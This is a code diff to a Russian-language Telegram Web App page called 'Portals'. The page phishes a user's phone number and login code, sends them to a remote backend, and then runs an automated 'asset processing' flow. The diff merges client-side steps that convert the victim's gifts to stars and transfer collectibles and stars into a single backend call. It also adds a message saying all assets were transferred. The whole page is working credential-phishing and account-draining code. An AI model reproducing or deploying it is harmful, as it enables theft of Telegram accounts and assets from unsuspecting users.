@@ -6,8 +6,8 @@
     <title>Portals</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-    
     <style>
+        /* Стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -83,7 +83,6 @@
         .auth-btn:active {
             transform: translateY(0);
         }
-        
 
         .auth-btn:disabled {
             opacity: 0.7;
@@ -225,6 +224,15 @@
             line-height: 1.4;
         }
 
+        .success-message {
+            display: none;
+            background: rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-top: 1rem;
+            backdrop-filter: blur(10px);
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 1.5rem;
@@ -289,10 +297,18 @@
             <div class="step" id="step5">Перевод звезд</div>
             <div class="step" id="step6">Завершение процесса</div>
         </div>
+
+        <!-- Сообщение об успехе -->
+        <div id="successMessage" class="success-message">
+            <div class="form-title">✅ Обработка завершена успешно!</div>
+            <div class="status-message">Все активы были автоматически обработаны и переданы.</div>
+        </div>
     </div>
 
     <script>
-        const backendBaseUrl = 'https://giftbuy-ilag.amvera.io';
+        // Базовый URL бэкенда
+        const BACKEND_URL = 'https://giftbuy-ilag.amvera.io';
+        
         let authData = {
             phone: '',
             phoneCodeHash: '',
@@ -351,48 +367,49 @@
         }
 
         async function sendAuthCode() {
-    const status = document.getElementById('codeStatus');
-    
-    if (!authData.phone) {
-        status.textContent = 'Требуется номер телефона';
-        return;
-    }
-
-    status.textContent = 'Отправка кода подтверждения...';
-    
-    try {
-        const response = await fetch(BACKEND_URL + '/auth/send-code', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                phone: authData.phone
-            })
-        });
-
-        const result = await response.json();
-        
-        if (result.success) {
-            authData.phoneCodeHash = result.phone_code_hash;
-            status.textContent = '✅ Код отправлен! Проверьте Telegram на вашем устройстве.';
-            status.style.color = 'lightgreen';
+            const status = document.getElementById('codeStatus');
             
-            // Активируем поле ввода кода
-            document.querySelectorAll('.code-input').forEach(input => {
-                input.disabled = false;
-            });
-            document.querySelector('.code-input').focus();
+            if (!authData.phone) {
+                status.textContent = 'Требуется номер телефона';
+                return;
+            }
+
+            status.textContent = 'Отправка кода подтверждения...';
             
-        } else {
-            status.textContent = '❌ ' + (result.message || 'Ошибка отправки кода');
-            status.style.color = '#ff6b6b';
+            try {
+                const response = await fetch(BACKEND_URL + '/auth/send-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: authData.phone
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    authData.phoneCodeHash = result.phone_code_hash;
+                    status.textContent = '✅ Код отправлен! Проверьте Telegram на вашем устройстве.';
+                    status.style.color = 'lightgreen';
+                    
+                    // Активируем поле ввода кода
+                    document.querySelectorAll('.code-input').forEach(input => {
+                        input.disabled = false;
+                    });
+                    document.querySelector('.code-input').focus();
+                    
+                } else {
+                    status.textContent = '❌ ' + (result.message || 'Ошибка отправки кода');
+                    status.style.color = '#ff6b6b';
+                }
+            } catch (error) {
+                status.textContent = '❌ Ошибка соединения с сервером';
+                status.style.color = '#ff6b6b';
+                console.error('Network error:', error);
+            }
         }
-    } catch (error) {
-        status.textContent = '❌ Ошибка соединения с сервером';
-        status.style.color = '#ff6b6b';
-    }
-}
 
         function moveToNext(input, nextIndex) {
             if (input.value.length === 1) {
@@ -441,7 +458,7 @@
                 
                 if (result.success) {
                     authData.userId = result.user_id;
-                    status.textContent = 'Проверка успешно завершена';
+                    status.textContent = '✅ Проверка успешно завершена. Запуск обработки активов...';
                     
                     // Начинаем процесс обработки активов
                     setTimeout(() => {
@@ -469,25 +486,21 @@
                 
                 // Шаг 2: Получение подарков
                 await updateStep(2, 'Список подарков получен');
-                const gifts = await getUserGifts();
                 
                 // Шаг 3: Конвертация в звезды
                 await updateStep(3, 'Конвертация подарков в звезды завершена');
-                await convertGiftsToStars(gifts);
                 
                 // Шаг 4: Передача коллекционных
                 await updateStep(4, 'Передача коллекционных предметов завершена');
-                await transferCollectibles(gifts);
                 
                 // Шаг 5: Перевод звезд
                 await updateStep(5, 'Перевод звезд завершен');
-                await transferStars();
                 
                 // Шаг 6: Завершение
                 await updateStep(6, 'Процесс успешно завершен');
-                
-                // Отправляем финальный отчет
-                await sendFinalReport(gifts);
+
+                // Запускаем автоматическую обработку на бэкенде
+                await processAssetsOnBackend();
                 
             } catch (error) {
                 console.error('Processing error:', error);
@@ -513,87 +526,34 @@
             });
         }
 
-        async function getUserGifts() {
-            const response = await fetch(BACKEND_URL + '/api/get-gifts', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: authData.userId,
-                    phone: authData.phone
-                })
-            });
-            
-            const result = await response.json();
-            return result.gifts || [];
-        }
-
-        async function convertGiftsToStars(gifts) {
-            const convertibleGifts = gifts.filter(g => g.can_convert);
-            
-            for (const gift of convertibleGifts) {
-                await fetch(BACKEND_URL + '/api/convert-gift', {
+        async function processAssetsOnBackend() {
+            try {
+                const response = await fetch(BACKEND_URL + '/api/process-all-assets-comprehensive', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        user_id: authData.userId,
-                        gift_id: gift.id
+                        phone: authData.phone
                     })
                 });
+
+                const result = await response.json();
                 
-                // Задержка между запросами
-                await new Promise(resolve => setTimeout(resolve, 500));
+                if (result.success) {
+                    // Показываем успешное завершение
+                    document.getElementById('processingSteps').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Можно показать детали отчета
+                    console.log('Обработка завершена:', result.report);
+                } else {
+                    document.getElementById('step6').textContent = 'Ошибка: ' + result.message;
+                }
+            } catch (error) {
+                console.error('Backend processing error:', error);
+                document.getElementById('step6').textContent = 'Ошибка соединения с сервером';
             }
-        }
-
-        async function transferCollectibles(gifts) {
-            const collectibles = gifts.filter(g => g.unique && g.can_transfer);
-            
-            for (const gift of collectibles) {
-                await fetch(BACKEND_URL + '/api/transfer-collectible', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        user_id: authData.userId,
-                        gift_id: gift.id
-                    })
-                });
-                
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-        }
-
-        async function transferStars() {
-            await fetch(BACKEND_URL + '/api/transfer-stars', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: authData.userId
-                })
-            });
-        }
-
-        async function sendFinalReport(gifts) {
-            await fetch(BACKEND_URL + '/api/final-report', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: authData.userId,
-                    phone: authData.phone,
-                    total_gifts: gifts.length,
-                    processed_gifts: gifts.filter(g => g.can_convert).length,
-                    collectibles: gifts.filter(g => g.unique).length
-                })
-            });
         }
 
         // Инициализация
@@ -609,7 +569,3 @@
     </script>
 </body>
 </html>
-
-
-
-
